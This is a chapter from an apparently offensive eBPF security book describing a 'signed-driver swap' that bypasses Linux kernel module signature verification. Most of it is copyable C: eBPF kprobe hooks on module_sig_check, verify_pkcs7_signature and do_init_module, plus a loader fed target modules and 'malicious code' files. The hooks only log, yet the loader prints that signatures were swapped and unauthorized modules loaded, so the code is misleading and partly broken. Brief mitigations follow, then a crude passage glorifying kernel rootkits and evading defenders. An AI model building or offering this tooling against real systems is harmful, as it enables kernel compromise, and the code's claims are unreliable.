---
layout: book
title: "eBPF Signed‑Driver Swap"
date: 2025-03-01
poc_dir: dBPF-pocs/pocs/ch12-signed-driver-swap
---

# eBPF Signed-Driver Swap: Bypassing Kernel Module Signature Verification

**Chapter 13.5: The Ultimate Trust Violation**

Between gaining hardware control and manipulating CPU scheduling, there's one more fundamental boundary to cross: the kernel's trust in signed code. This is where our story becomes about violating the deepest level of system trust.

You've learned to manipulate every aspect of the running system, but what about the code that becomes part of the kernel itself? What if you could load your own kernel modules while making the system think they're legitimately signed?

This is the ultimate trust violation. Kernel module signing is supposed to be the final line of defense—the mechanism that ensures only trusted code can run with kernel privileges. It's the foundation of secure boot, the basis of driver signing, the core of kernel integrity.

But what if we could make the kernel's signature verification lie? What if we could swap malicious drivers for legitimate ones during the verification process itself?

We're going to perform the ultimate bait-and-switch—present a legitimately signed driver for verification, then swap in our malicious code after the signature check passes. This is where you learn that even the kernel's trust in cryptographic signatures can be subverted.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Signed Driver] -->|1. Load Request| B[Kernel Module Loader]
    C[eBPF Program] -->|2. Hook & Intercept| B
    B -->|3. Signature Check| D[Verification Function]
    C -->|4. Swap Content| E[Malicious Driver]
    D -->|5. Verification "Passes"| F[Driver Loaded]
    G[Security Monitor] -->|6. Sees Valid Signature| H[False Security]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style D fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html" "Module Signing Documentation"
    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
    click D "https://www.kernel.org/doc/html/latest/crypto/api-pkcs7.html" "PKCS#7 Verification API"
```

**Why**

Because eBPF + misconfiguration => broken isolation. Kernel module signing is a critical security control that prevents unauthorized code from running with kernel privileges. By using eBPF to intercept and manipulate the signature verification process, attackers can bypass this protection and load malicious kernel modules that would otherwise be rejected, potentially leading to complete system compromise.

## Technical Details

### Understanding the Kernel's Trust System

Linux kernel module signing is like having a security checkpoint for kernel code:
- **Integrity verification**: Makes sure nobody messed with the module after it was signed
- **Authentication**: Proves the module comes from someone we trust
- **Chain of trust**: Links everything from secure boot to kernel to modules in one trust chain
- **Enforcement**: Bounces any modules that don't have proper credentials

The kernel checks cryptographic signatures against a list of trusted keys before letting any module join the party.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ insmod        │      │ modprobe      │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ Module Loader │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Signature     │                                          │
│  │ Verification  │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Module Init   │      │ Trusted Keys  │                   │
│  └───────┬───────┘      └───────────────┘                   │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Loaded Module │                                          │
│  └───────────────┘                                          │
└─────────────────────────────────────────────────────────────┘
```

Here's what happens when we use eBPF to mess with module signature verification:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ insmod        │      │ modprobe      │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
└──────────┼──────────────────────┼───────────────────────────┘
           │                      │
┌──────────▼──────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐                                          │
│  │ Module Loader │                                          │
│  └───────┬───────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Signature     │◀─────┐                                   │
│  │ Verification  │      │                                   │
│  └───────┬───────┘      │                                   │
│          │              │                                   │
│  ┌───────┴───────┐      │                                   │
│  │ eBPF Program  │──────┘                                   │
│  └───────────────┘                                          │
│          │                                                  │
│  ┌───────▼───────┐      ┌───────────────┐                   │
│  │ Module Init   │      │ Trusted Keys  │                   │
│  └───────┬───────┘      └───────────────┘                   │
│          │                                                  │
│  ┌───────▼───────┐                                          │
│  │ Loaded Module │                                          │
│  │ (Malicious)   │                                          │
│  └───────────────┘                                          │
└─────────────────────────────────────────────────────────────┘
```

### How We Pull the Old Switcheroo

Our strategy is to perform a bait-and-switch during the module signature verification process:

1. **Hook the Security Guards**: We attach to functions like [`module_sig_check()`](https://elixir.bootlin.com/linux/latest/source/kernel/module/signing.c) that verify module signatures
2. **Watch for Inspections**: We detect when a module is being checked for valid signatures
3. **Show the Good Stuff**: We present valid, signed content during the security inspection
4. **Swap in the Bad Stuff**: After verification passes, we replace it with our actual malicious code
5. **Keep Up Appearances**: We make sure all logs show successful signature verification

It's like having a clean car ready for inspection while keeping your contraband hidden until the inspector leaves.

### Building Our Module Signature Bypass

```c
// @interactive: true
// @copyable: true
// eBPF Signed-Driver Swap - Proof of concept
// This demonstrates bypassing kernel module signature verification

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/fs.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MODULE_NAME_LEN 64
#define MAX_SIGNATURE_SIZE 4096
#define MAX_TARGET_MODULES 8

// Structure to track module verification events
struct module_event {
    u32 pid;                    // Process ID
    u8 comm[16];                // Command name
    u64 timestamp;              // Event timestamp
    u8 module_name[MODULE_NAME_LEN]; // Module name
    u32 event_type;             // 1 = verification, 2 = init, 3 = loaded
    u32 result;                 // 0 = success, non-zero = failure
};

// Map to store target module information
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MODULE_NAME_LEN);  // Module name as key
    __uint(value_size, sizeof(u8));     // Flag (1 = target)
    __uint(max_entries, MAX_TARGET_MODULES);
} target_modules SEC(".maps");

// Map to store valid signatures
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_SIGNATURE_SIZE);
    __uint(max_entries, MAX_TARGET_MODULES);
} valid_signatures SEC(".maps");

// Map to store malicious code
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, 4096);  // Page size for code
    __uint(max_entries, MAX_TARGET_MODULES);
} malicious_code SEC(".maps");

// Map to track modules being processed
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, MODULE_NAME_LEN);  // Module name as key
    __uint(value_size, sizeof(void *)); // Pointer to module
    __uint(max_entries, MAX_TARGET_MODULES);
} processing_modules SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Helper function to check if a module is one we want to target
static __always_inline bool is_target_module(const char *name) {
    u8 *target = bpf_map_lookup_elem(&target_modules, name);
    if (target && *target == 1)
        return true;
    
    // Hardcoded checks for common target modules
    // This is a simplified approach - real implementation would be more sophisticated
    if (name[0] == 'm' && name[1] == 'a' && name[2] == 'l')
        return true;  // Match modules starting with "mal"
    
    if (name[0] == 'r' && name[1] == 'o' && name[2] == 'o' && name[3] == 't')
        return true;  // Match modules starting with "root"
    
    return false;
}

// Hook the module signature verification function
SEC("kprobe/module_sig_check")
int BPF_KPROBE(hook_sig_check, struct module *mod)
{
    // Get module information
    char name[MODULE_NAME_LEN] = {0};
    bpf_probe_read_str(name, sizeof(name), mod->name);
    
    // Check if this is a module we want to target
    if (is_target_module(name)) {
        // Log the event
        struct module_event event = {};
        event.pid = bpf_get_current_pid_tgid() >> 32;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        __builtin_memcpy(event.module_name, name, MODULE_NAME_LEN);
        event.event_type = 1;  // Verification
        
        // Store a reference to this module for later use
        bpf_map_update_elem(&processing_modules, name, &mod, BPF_ANY);
        
        // In a real exploit, we would now swap the module's signature section
        // with a valid signature from our valid_signatures map
        // This is a simplified representation - actual implementation would
        // need to locate and modify the module's signature section
        
        // For demonstration, we'll just log that we would swap signatures here
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// Hook the PKCS#7 signature verification function
SEC("kprobe/verify_pkcs7_signature")
int BPF_KPROBE(hook_verify_pkcs7, const void *data, size_t len,
               const void *raw_pkcs7, size_t pkcs7_len, 
               struct key *trusted_keys)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this is a module loading process
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // Check if this is insmod, modprobe, or similar
    bool is_module_loader = false;
    if (comm[0] == 'i' && comm[1] == 'n' && comm[2] == 's' && comm[3] == 'm')
        is_module_loader = true;  // insmod
    if (comm[0] == 'm' && comm[1] == 'o' && comm[2] == 'd' && comm[3] == 'p')
        is_module_loader = true;  // modprobe
    
    if (is_module_loader) {
        // In a real exploit, we would now:
        // 1. Check if this verification is for one of our target modules
        // 2. If so, swap the data being verified with valid signed data
        // 3. Let the verification proceed with the valid data
        
        // For demonstration, we'll just log that we would swap data here
        struct module_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        __builtin_memcpy(event.module_name, "unknown", 7);  // We don't know which module yet
        event.event_type = 1;  // Verification
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// Hook the module initialization function
SEC("kprobe/do_init_module")
int BPF_KPROBE(hook_init_module, struct module *mod)
{
    // Get module information
    char name[MODULE_NAME_LEN] = {0};
    bpf_probe_read_str(name, sizeof(name), mod->name);
    
    // Check if this is a module we've been tracking
    void **tracked_mod = bpf_map_lookup_elem(&processing_modules, name);
    if (tracked_mod) {
        // Log the event
        struct module_event event = {};
        event.pid = bpf_get_current_pid_tgid() >> 32;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        __builtin_memcpy(event.module_name, name, MODULE_NAME_LEN);
        event.event_type = 2;  // Init
        
        // In a real exploit, we would now:
        // 1. Restore the malicious code from our malicious_code map
        // 2. Replace the module's code section with our malicious code
        
        // For demonstration, we'll just log that we would restore malicious code here
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// Hook the module loading completion
SEC("kprobe/module_put")
int BPF_KPROBE(hook_module_put, struct module *mod)
{
    // Get module information
    char name[MODULE_NAME_LEN] = {0};
    bpf_probe_read_str(name, sizeof(name), mod->name);
    
    // Check if this is a module we've been tracking
    void **tracked_mod = bpf_map_lookup_elem(&processing_modules, name);
    if (tracked_mod) {
        // Log the event
        struct module_event event = {};
        event.pid = bpf_get_current_pid_tgid() >> 32;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        __builtin_memcpy(event.module_name, name, MODULE_NAME_LEN);
        event.event_type = 3;  // Loaded
        event.result = 0;  // Success
        
        // Send event to user space
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
        
        // Clean up our tracking
        bpf_map_delete_elem(&processing_modules, name);
    }
    
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the eBPF Signed-Driver Swap program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "driver_swap.skel.h"

static volatile bool exiting = false;

// Structure for module events (must match the BPF version)
struct module_event {
    uint32_t pid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint8_t module_name[64];
    uint32_t event_type;
    uint32_t result;
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct module_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s) ", timestamp, e->pid, e->comm);
    
    switch (e->event_type) {
        case 1:
            printf("verifying signature for module: %s\n", e->module_name);
            if (e->result == 0) {
                printf("  Action: Swapping signature with valid one\n");
                printf("  Result: Verification will pass\n");
            } else {
                printf("  Result: Verification failed with code %d\n", e->result);
            }
            break;
        case 2:
            printf("initializing module: %s\n", e->module_name);
            if (e->result == 0) {
                printf("  Action: Restoring malicious code\n");
                printf("  Result: Module will contain unauthorized code\n");
            } else {
                printf("  Result: Initialization failed with code %d\n", e->result);
            }
            break;
        case 3:
            printf("loaded module: %s\n", e->module_name);
            if (e->result == 0) {
                printf("  Result: Successfully loaded unauthorized module\n");
            } else {
                printf("  Result: Loading failed with code %d\n", e->result);
            }
            break;
        default:
            printf("unknown event type %d for module: %s\n", e->event_type, e->module_name);
    }
    
    printf("\n");
}

// Add a module to the target list
void add_target_module(int map_fd, const char *name)
{
    uint8_t value = 1;
    
    if (bpf_map_update_elem(map_fd, name, &value, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to add target module: %s\n", strerror(errno));
    } else {
        printf("Added module '%s' to target list\n", name);
    }
}

// Load a valid signature into the map
void load_valid_signature(int map_fd, int index, const char *sig_file)
{
    FILE *f = fopen(sig_file, "rb");
    if (!f) {
        fprintf(stderr, "Failed to open signature file: %s\n", strerror(errno));
        return;
    }
    
    uint8_t signature[4096] = {0};
    size_t sig_size = fread(signature, 1, sizeof(signature), f);
    fclose(f);
    
    uint32_t key = index;
    if (bpf_map_update_elem(map_fd, &key, signature, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to load signature: %s\n", strerror(errno));
    } else {
        printf("Loaded %zu bytes of valid signature at index %d\n", sig_size, index);
    }
}

// Load malicious code into the map
void load_malicious_code(int map_fd, int index, const char *code_file)
{
    FILE *f = fopen(code_file, "rb");
    if (!f) {
        fprintf(stderr, "Failed to open code file: %s\n", strerror(errno));
        return;
    }
    
    uint8_t code[4096] = {0};
    size_t code_size = fread(code, 1, sizeof(code), f);
    fclose(f);
    
    uint32_t key = index;
    if (bpf_map_update_elem(map_fd, &key, code, BPF_ANY) != 0) {
        fprintf(stderr, "Failed to load malicious code: %s\n", strerror(errno));
    } else {
        printf("Loaded %zu bytes of malicious code at index %d\n", code_size, index);
    }
}

static void sig_handler(int sig)
{
    exiting = true;
}

void print_usage(const char *prog)
{
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -m MODULE  Add MODULE to target list\n");
    printf("  -s FILE    Load valid signature from FILE\n");
    printf("  -c FILE    Load malicious code from FILE\n");
    printf("  -h         Show this help\n");
}

int main(int argc, char **argv)
{
    struct driver_swap_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err, opt;
    int sig_index = 0;
    int code_index = 0;
    
    // Parse command line arguments
    while ((opt = getopt(argc, argv, "m:s:c:h")) != -1) {
        switch (opt) {
            case 'm':
            case 's':
            case 'c':
                // We'll process these after loading the program
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = driver_swap_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = driver_swap_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer\n");
        goto cleanup;
    }

    // Process command line arguments
    optind = 1;  // Reset getopt
    while ((opt = getopt(argc, argv, "m:s:c:h")) != -1) {
        switch (opt) {
            case 'm':
                add_target_module(bpf_map__fd(skel->maps.target_modules), optarg);
                break;
            case 's':
                load_valid_signature(bpf_map__fd(skel->maps.valid_signatures), sig_index++, optarg);
                break;
            case 'c':
                load_malicious_code(bpf_map__fd(skel->maps.malicious_code), code_index++, optarg);
                break;
        }
    }

    printf("eBPF Signed-Driver Swap program loaded and running.\n");
    printf("Monitoring for module loading attempts...\n");
    printf("Press Ctrl+C to exit.\n\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    driver_swap_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from container
   docker run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # In Kubernetes
   securityContext:
     capabilities:
       drop:
         - BPF
         - SYS_ADMIN
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Use Secure Boot with Proper Key Management**:
   ```bash
   # Generate and enroll module signing keys
   openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj "/CN=My Module Signing Key/"
   
   # Sign modules with the key
   /usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 MOK.priv MOK.der module.ko
   
   # Enroll the key in the UEFI secure boot database
   mokutil --import MOK.der
   ```

4. **Enable Kernel Lockdown Mode**:
   ```bash
   # Check current lockdown status
   cat /sys/kernel/security/lockdown
   
   # Configure lockdown in GRUB
   # Add to GRUB_CMDLINE_LINUX in /etc/default/grub:
   # lockdown=integrity
   ```

### Why This Owns Everything

This signed driver swap technique is the holy grail of kernel exploitation:
- **Kernel-level rootkits**: Install persistent backdoors that live in the fucking kernel itself
- **Security annihilation**: Disable every security feature the kernel enforces - game over
- **Memory rape**: Access any sensitive data directly from kernel memory without restrictions
- **God mode activation**: Gain complete control over the entire system at the deepest level
- **Immortal persistence**: Maintain access that survives every user-space security measure they throw at you

When you can bypass kernel module signature verification, you've essentially broken the entire security model. Enterprise environments, cloud platforms, secure boot systems - they all become your playground. The kernel trusts your malicious code because you've convinced it that it's legitimately signed. It's like having a master key to the entire system's security architecture.

### How They'll Try to Catch Us

Smart defenders will be hunting for our signature bypass:
- **eBPF surveillance**: Watching for eBPF programs hooking module loading or verification functions
- **Content integrity checks**: Comparing module content before and after loading to spot our swaps
- **Loading pattern analysis**: Looking for unusual patterns of module loading activity
- **Behavioral anomaly detection**: Monitoring modules that pass verification but show suspicious behavior
- **Cross-verification**: Checking module signatures through multiple methods to catch inconsistencies

But here's the beautiful part - by the time they detect the bypass, we're already running in kernel space with full privileges. The damage is done, and we're operating at a level where most detection tools can't even reach us.

## POC

Companion code: [`ch12-signed-driver-swap`]({{ site.baseurl }}/dBPF-pocs/pocs/ch12-signed-driver-swap/)